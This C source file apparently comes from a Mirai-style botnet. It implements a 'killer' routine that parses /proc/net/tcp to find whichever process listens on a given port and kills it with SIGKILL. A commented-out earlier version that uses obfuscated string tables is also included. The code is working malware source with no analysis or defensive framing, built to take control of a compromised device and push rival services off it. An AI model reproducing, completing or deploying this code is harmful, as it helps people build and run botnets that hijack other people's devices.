#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

unsigned char killer_kill_by_port(uint16_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    unsigned char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int fd = 0;
    unsigned char inode[16] = {0};
    unsigned char *ptr_path = path;
    int ret = 0;
    unsigned char port_str[16];

    util_zero(port_str, 16);
    util_zero(path, PATH_MAX);
    util_zero(exe, PATH_MAX);
    util_zero(buffer, 513);

    util_itoa(ntohs(port), port_str, 16);
    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d %s\n", ntohs(port), port_str);
    #endif
    if(util_len(port_str, 16) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    #ifdef DEBUG
        printf("[killer] innode %s\n", port_str);
    #endif

    

    fd = open("/proc/net/tcp", O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), port_str) != -1)
        {
            int column_index = 0;
            unsigned char in_column = 0;
            unsigned char listening_state = 0;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if(in_column == 1)
                        column_index++;

                    if(in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }

                    in_column = 0;
                }
            }
            ii = i;

            if(listening_state == 0)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_len(&(buffer[ii]), 513-ii) > 15)
                continue;

            util_cpy(inode, &(buffer[ii]), util_len(&(buffer[ii]), 513-ii));
            break;
        }
    }

    close(fd);

    if(util_len(inode, 16) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif
        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir("/proc/")) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            unsigned char *pid_str = (unsigned char *)entry->d_name;

            if(*pid_str < '0' || *pid_str > '9')
                continue;

            util_cpy(ptr_path, "/proc/", 6);
            util_cpy(ptr_path+util_strlen(ptr_path), pid_str, util_strlen(pid_str));
            util_cpy(ptr_path+util_strlen(ptr_path), "/exe", 4);

            #ifdef DEBUG
            printf("Checking EXE path (%s)\r\n", ptr_path);
            #endif

            if(readlink((char *)path, (char *)exe, PATH_MAX) == -1)
            {
                util_zero(path, PATH_MAX);
                continue;
            }

            util_zero(path, PATH_MAX);

            util_cpy(ptr_path, "/proc/", 6);
            util_cpy(ptr_path + util_len(ptr_path, PATH_MAX), pid_str, util_len(pid_str, sizeof(entry->d_name)));
            util_cpy(ptr_path + util_len(ptr_path, PATH_MAX), "/fd", 3);

            #ifdef DEBUG
            printf("Opening process FD file (%s)\r\n", ptr_path);
            #endif

            if((fd_dir = opendir((char *)path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    unsigned char *fd_str = (unsigned char *)fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_zero(path, PATH_MAX);

                    util_cpy(ptr_path, "/proc/", 6);
                    util_cpy(ptr_path+util_len(ptr_path, PATH_MAX), pid_str, util_len(pid_str, sizeof(entry->d_name)));
                    util_cpy(ptr_path+util_len(ptr_path, PATH_MAX), "/fd/", 4);
                    util_cpy(ptr_path+util_len(ptr_path, PATH_MAX), fd_str, util_len(fd_str, sizeof(fd_entry->d_name)));

                    if(readlink((char *)path, (char *)exe, PATH_MAX) == -1)
                    {
                        util_zero(path, PATH_MAX);
                        continue;
                    }
                    util_zero(path, PATH_MAX);

                    if(util_exists(exe, inode, util_len(exe, PATH_MAX), util_len(inode, 16)) != 0)
                    {
                        kill(util_atoi(pid_str), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }

            util_zero(path, PATH_MAX);
        }
        closedir(dir);
    }
    return ret;
}

/*
BOOL killer_kill_by_port(port_t port)
{
    FILE *fd;
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];
    char *endptr;

#ifdef DEBUG
    printf("[killer/port]: Finding and killing processes holding (port: %d)\n", ntohs(port));
#endif

    sprintf(port_str, "%d", ntohs(port));
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = fopen("/proc/net/tcp", O_RDONLY);
    if (ferror(fd))
        return 0;

    while (fgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (strstr(&(buffer[ii]), port_str) != NULL)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    fclose(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("[killer/port]: Failed to find inode for (port: %d)\n", ntohs(port));
#endif
        return 0;
    }
	
	table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
	
#ifdef DEBUG
    printf("[killer/port]: Found inode \"%s\" for (port: %d)\n", inode, ntohs(port));
#endif

    if ((dir = opendir("/proc/")) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, "/proc/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (strstr(exe, inode) != NULL)
                    {
#ifdef DEBUG
                        printf("[killer/port]: Found (pid: %ld) for (port: %d)\n", strtol(pid, &endptr, 10), ntohs(port));
#else
                        kill(util_atoi(pid), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(2);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

*/